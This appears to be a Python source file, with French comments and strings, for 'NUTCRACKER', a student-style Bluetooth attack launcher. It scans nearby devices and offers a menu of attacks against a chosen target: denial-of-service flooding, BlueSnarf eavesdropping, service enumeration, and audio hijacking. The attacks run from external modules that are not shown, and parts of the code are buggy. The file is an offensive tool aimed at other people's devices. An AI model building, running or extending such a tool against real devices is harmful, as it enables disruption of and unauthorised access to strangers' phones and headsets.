#!/usr/local/bin/python
# -*- coding: utf-8 -*-
import os, sys
import select
import bluetooth
import time

class AttaquesPossibles :
    def __init__(self,versionBluetooth,attaquePossible):
        self.versionBluetooth=versionBluetooth #C'est un float, voir s'il faudrait un string plutot, par exemple plusieurs points
        self.listeAttaquePossible=attaquePossible #C'est une liste d'Attaque
    def __str__(self):
        print("Version Bluetooth de l'appareil :",self.versionBluetooth)
        for i in range(len(self.listeAttaquePossible)) :
            print("Attaque",i+1,self.listeAttaquePossible[i])

class Appareil :
    def __init__(self,nom,versionBluetooth,adresseMac,type,services=[],RSSI=0):
        self.nom=nom
        self.versionBluetooth=versionBluetooth
        self.adresseMac=adresseMac
        self.type=type
        self.services=services
        self.RSSI=RSSI
    def __str__(self):
        a=str("Appareil : "+self.nom+" \nType : "+self.type+"\nAdresse Mac : "+self.adresseMac+"\nVersion Bluetooth : "+str(self.versionBluetooth)+"\n"+"Puissance :"+str(self.RSSI))
        a+="\nServices :"
        for i in self.services :
            a+="\n"+str(i)
        return a
    def __eq__(self, other):
        if other is Appareil :
            return self.nom==Appareil(other).nom
        else :
            return False

    def __contains__(self,liste) :
        sortie=[]
        for x in liste :
            if x is Appareil :
                sortie.append(Appareil(x).adresseMac)
        return sortie.__contains__(self.adresseMac)


    def recuperation(liste):
        if len(liste)>=5 :
            adresse=liste[0]
            nom=str(liste[1],"UTF-8")
            typ=liste[2]
            service=liste[3]
            Rssi=liste[4]
            return Appareil(nom,1.4,adresse,typ,service,Rssi)
        else :
            return None 
class Attaque :
    def __init__ (self,nom,description,path) :
        self.nom=nom
        self.description=description
        self.path=path
    def __str__(self):
        return self.nom+"\n"+self.description

def loicDessin(path) :
    lignes=""
    with open(path, 'r') as filin:
        for ligne in filin:
            lignes+=ligne
    return lignes






def listeAppareilsDetectes() :
    sortieFinal=[]
    class MyDiscoverer(bluetooth.DeviceDiscoverer):
    
        def pre_inquiry(self):
            self.done = False
         
            

        def device_discovered(self, address, device_class, rssi, name):
            sortie=[]
            sortie.append(address)
            sortie.append(name)
            print("{} - {}".format(address, name))
            major_classes = ("Miscellaneous",
                            "Computer",
                            "Phone",
                            "LAN/Network Access Point",
                            "Audio/Video",
                            "Peripheral",
                            "Imaging")
            major_class = (device_class >> 8) & 0xf
            service_classes = ((16, "positioning"),
                            (17, "networking"),
                            (18, "rendering"),
                            (19, "capturing"),
                            (20, "object transfer"),
                            (21, "audio"),
                            (22, "telephony"),
                            (23, "information"))
            sortie.append(major_classes[major_class])
            temp=[]
            for bitpos, classname in service_classes:
                if device_class & (1 << (bitpos-1)):
                    temp.append(classname)
            sortie.append(temp)

            sortie.append(rssi)
            appareilTemp=Appareil.recuperation(sortie)
            print(appareilTemp)
            if not sortieFinal.__contains__(appareilTemp) and appareilTemp!=None:   
                sortieFinal.append(appareilTemp)
                print("bien ajouté")
            else :
                print("déjà présent")


        def inquiry_complete(self):
            self.done = True

    d = MyDiscoverer()
    d.find_devices()

    readfiles = [ d, ]
    compteur=0
    while True:
        print("...")
        compteur+=1
        rfds = select.select( readfiles, [], [] )[0]

        if d in rfds:
            d.process_event()

        if d.done: break
        if compteur==10 : break
    return sortieFinal
    

def lancementAttaque(attaque,appareil):
    if attaque.path.__contains__("hijack") :

        import attack.hijack as hi
        try :
            hi.connect(appareil.adresseMac)
            time.sleep(5)
            hi.HiJackAudio(appareil.adresseMac)
        except Exception as e:
            print(e)

    if attaque.path.__contains__("dos") :
        # import dos as des
        import attack.dos as des
        try :
            des.use(appareil.adresseMac)
        except Exception :
            print("beug")
    if attaque.path.__contains__("get_services") :
        # import dos as des
        import attack.get_services as get
        try :
            get.main(appareil.adresseMac)
            if input("Do you want to attack ? (Y|N)") in ["Y","y"] :
                __main__2(appareil)
        except Exception :
            print("beug")

listeAppareil=listeAppareilsDetectes()

listedesAttaquesAvecVersion=[]
#Version 1.4
attaque1_4__1=Attaque("DOS","Surcharge le port Bluetooth de requetes par notre appareil","attack/dos")
attaque1_4__2=Attaque("BlueSnarf","Espionne les échanges Bluetooth de l'appareil",None)
attaque1_4__3=Attaque("Study","Analyse tous les ports de l'appareil et les affiches","attack/get_services")
attaque1_4__4=Attaque("Hi Jack","Surcharge l'écoute de la cible en lui imposant une mélodie de votre choix","attack/hijack")
attaques1_4 = AttaquesPossibles(1.4, [attaque1_4__1,attaque1_4__2,attaque1_4__3,attaque1_4__4])
listedesAttaquesAvecVersion.append(attaques1_4)

def Accueil() :
    print("Bienvenue sur NUTCRACKER, votre outil permettant de controler les appareils Bluetooth comme des marionettes")
    #dessin Loïc
    print("\n *************************************************************************************************************************** \n")
    print(loicDessin("ascii_art/ascii_art_nut.txt"))
    print("\n *************************************************************************************************************************** \n")
    print("Ce logiciel va d'abord scanner l'environemment dans lequel vous êtes, (adresse Mac, version Bluetooth, type d'appareil)")
    print("Pour ensuite vous proposer une liste des appareils Bluetooth dans la zone")
    print("Vous pourrez alors choisir un des appareils, et une liste d'attaque sera alors affiché en fonction de sa version Bluetooth..")
    print("%%%%%%%%%%%%%%%%%%")
    print()
    for i in range(len(listeAppareil)) :
        if listeAppareil[i]!=None :
            print("Appareil",i+1,":",listeAppareil[i].nom)
            print()
    print("Veuilez choisir un des appareils ci dessus en mettant le numéro correspondant, exit pour sortir")
    w = input().replace(" ","")
    if w == "exit":
        return None
    else:
        try:
            return listeAppareil[int(w) - 1]
        except Exception:
            print("/////")
            print("Veuillez entrer une valeur entière correspondante")
            return Accueil()


def rechercheAttaque(versionBluetooth) :
    for i in range (len(listedesAttaquesAvecVersion)) :
        if listedesAttaquesAvecVersion[i].versionBluetooth==versionBluetooth :
            print("***********")
            print("***********")
            print("Des attaques sont disponibles")
            return listedesAttaquesAvecVersion[i]
    print("Aucune attaque disponible pour cette version Bluetooth")
    return None


def confirmation(attaque,appareil) :
    print("***********")
    print("***********")
    boolean =input("Etes vous sûre de vouloir lancer l'attaque ? (Y/N)")
    if boolean=="Y" :
        lancementAttaque(attaque,appareil)
    else :
       __main__()


def displayAttack (appareil) :
    attaqueX=rechercheAttaque(appareil.versionBluetooth)
    print("***********")
    print("***********")
    print("Appareil attaqué")
    print("***********")
    print(appareil)
    print("***********")
    print("***********")
    print("Liste des attaques possibles pour cet appareil")
    print("%%%%%%%%%%%%%")
    for i in range(len(attaqueX.listeAttaquePossible)) :
        print("Attaque",i+1,":",attaqueX.listeAttaquePossible[i])
        print("%%%%%%%%%%%%%")
    print("Veuillez entrer le numéro correspondant à l'attaque choisie, exit pour revenir à l'accueil")
    w=input()
    if w=="exit" : __main__()
    else :
        try :
            print(attaqueX.listeAttaquePossible[int(w)-1])
            return attaqueX.listeAttaquePossible[int(w)-1]
        except Exception :
            print("Veuillez entrer une valeur entière correspondante")
            return displayAttack(appareil)

def __main__() :
    print("Recherche des appareils en cours...")
    appareilChoisi=Accueil()
    if appareilChoisi==None :
        return
    attaqueChoisi=displayAttack(appareilChoisi)

    confirmation(attaqueChoisi,appareilChoisi)

def __main__2(appareil) :
    
    if appareil==None :
        return
    attaque=displayAttack(appareil)

    confirmation(attaque,appareil)

__main__()
